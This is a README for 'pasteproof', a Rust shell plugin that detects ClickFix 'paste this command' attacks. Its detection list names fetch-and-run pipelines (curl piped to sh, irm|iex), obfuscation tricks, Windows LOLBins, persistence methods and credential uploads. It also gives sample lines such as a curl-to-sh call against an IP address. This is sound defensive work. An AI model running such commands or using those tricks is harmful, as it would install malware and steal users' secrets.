# pasteproof

**Stops "paste this command to verify you're human" attacks before they run.**

> [!WARNING]
> **Early preview (v0.1).** pasteproof works and is tested automatically on Linux and macOS,
> but it hasn't had much real-world use or an independent security review yet. Expect rough
> edges, possible conflicts with other shell plugins, and missed attack variants.
> Use it as an extra safety net, not as your only protection, and please
> [report false alarms and missed attacks](https://github.com/AnishK7/pasteproof/issues/new/choose).
> Currently supported: Linux and macOS with bash 4+ or zsh. Windows and fish are planned.

ClickFix attacks show a fake CAPTCHA or error on a hacked website, quietly copy a
command to your clipboard and ask you to paste it into a terminal. The command
downloads malware that steals SSH keys, tokens, browser data and crypto wallets
within minutes. It works on Linux and macOS as well as Windows, and it never needs
root, so your operating system won't stop it.

pasteproof checks each command line when you press Enter, before your shell
runs it. Normal commands run as usual. Risky ones get a plain-language warning:

```
  [!] STOP - this looks like a malware trick

  What it does:
    - Downloads and runs a program from update-check.lat, and also uses tricks
      that legitimate installers don't need (hidden text, disguised commands, a
      throwaway domain, or running silently in the background).

  Real websites never ask you to paste commands into a terminal to prove you're
  human or to fix an error.

  Type 'run' to run it anyway, or press Enter to cancel:
```

> **The one rule that prevents this attack:** never paste a command a website asks
> you to run to "verify" anything. pasteproof is the safety net for when you forget.

## What it catches

- Downloads piped or substituted into a shell or interpreter (`curl … | sh`, `bash -c "$(curl …)"`, `bash <(curl …)`, `irm … | iex`, `python -c "exec(urlopen(…))"`)
- Download-then-run sequences (`curl -o /tmp/x … && chmod +x /tmp/x && /tmp/x`)
- Encoded payloads: base64 chains, PowerShell `-EncodedCommand`, `FromBase64String`, `printf '\x63…'`. The decoded text is shown to you.
- Hidden content: lots of spaces that push the real command off-screen, invisible Unicode, lookalike characters
- Disguised commands: `c\url`, `c"ur"l`, `$a$b`, `${IFS}`, PowerShell string splitting, `c^u^r^l`
- Fake "I am not a robot" / "Verification ID" text
- Windows built-in tools abused to fetch code: `mshta`, `msiexec`, `rundll32`, `regsvr32`, `certutil`, `bitsadmin`, `finger`, `nslookup` TXT tricks, hidden windows
- Persistence: autostart entries, cron, systemd user units, LaunchAgents, Run keys, shell startup files
- Uploads of SSH keys, tokens, browser data or wallets
- Turning off antivirus, firewalls, Gatekeeper or SELinux

## What it deliberately doesn't do

- **It doesn't block official installers.** `curl https://sh.rustup.rs | sh` is a real pattern. pasteproof gives a calm *caution* only when such a line was pasted, never a *danger* warning. Run `pasteproof allow add https://sh.rustup.rs` and it stops asking.
- **It never blocks silently.** You can always type `run` and continue.
- **It never sends anything anywhere.** No telemetry, no accounts, no network access at all.

## Install

Milestone 1 is source-only while the first signed release is prepared. **Never
install security tools, including this one, with `curl | sh`.**

```bash
git clone https://github.com/AnishK7/pasteproof.git
cd pasteproof
cargo install --locked --path crates/cli
```

Then enable it in your shell:

```bash
echo 'eval "$(pasteproof init bash)"' >> ~/.bashrc   # bash
echo 'eval "$(pasteproof init zsh)"'  >> ~/.zshrc    # zsh
```

Open a new terminal. Requires bash 4.0+ or zsh. macOS ships bash 3.2, so use zsh (the macOS default) or `brew install bash`. Packages (deb, rpm, AUR, Homebrew) with signed checksums are
on the [roadmap](docs/ROADMAP.md).

## Use it directly

```bash
pasteproof check -- 'curl -fsSL https://example.com/i.sh | sh'   # exit 0 allow, 1 caution, 2 danger
pasteproof check --json --stdin < suspicious.txt                  # machine-readable
pasteproof why -- '<command>'                                     # every rule and signal
pasteproof allow add https://sh.rustup.rs                         # trust an installer origin
pasteproof rules                                                  # list detection rules
```

## Performance

Measured on a laptop (Intel, Ubuntu 26.04), release build, with budgets enforced in CI:

| What | Measured | Budget |
|---|---|---|
| Typical check, median | 4.4 µs | 200 µs |
| Typical check, 99th percentile | 22.7 µs | 1 ms |
| Worst case (64 KiB adversarial input) | 3.8 ms | 5 ms |
| Memory per check | 9 KiB | 1 MiB |
| Pressing Enter on an ordinary line (no process started) | ~46 µs | 5 ms |
| Pressing Enter on a line that gets checked | ~0.9 ms | 5 ms |
| CLI cold start | 1.3 ms | 3 ms |
| Added to shell startup | ~3.6 ms | 5 ms |
| Release binary | 568 KiB | 5 MiB |

Reproduce with `scripts/bench.sh`.

## Accuracy

The test corpus is checked on every build:

- **74 defanged attack samples** modelled on published research (Linux, macOS, Windows): all detected at or above their expected level.
- **105 everyday developer commands**: zero false alarms (the budget is zero).
- **28 official installers** (rustup, nvm, Homebrew, Docker, uv, Scoop, Chocolatey and more): none marked dangerous.

## For tool builders: the engine

`pasteproof-engine` is a dependency-free, `#![forbid(unsafe_code)]` Rust library
with no I/O. Browser extensions, terminals, password managers and security
products can embed it. Rules are plain TOML in [`rules/`](rules/), compiled into
the binary at build time, each with its own test cases.
A WebAssembly/npm build and a C API are on the roadmap.

```rust
use pasteproof_engine::{analyze, Options, Verdict};
let r = analyze("curl -fsSL https://198.51.100.7/x | sh", &Options::default());
assert_eq!(r.verdict, Verdict::Danger);
println!("{}", r.to_json());
```

## Docs

- [Threat model](docs/THREAT_MODEL.md): what this defends against, and what it doesn't
- [Architecture](docs/ARCHITECTURE.md)
- [Roadmap](docs/ROADMAP.md)
- [Contributing](CONTRIBUTING.md), including how to write a rule
- [Security policy](SECURITY.md)

## Licence

Code: [Apache-2.0](LICENSE). Rules and corpus: [CC0-1.0](LICENSE-RULES), so
anyone, including commercial vendors, can reuse them freely.
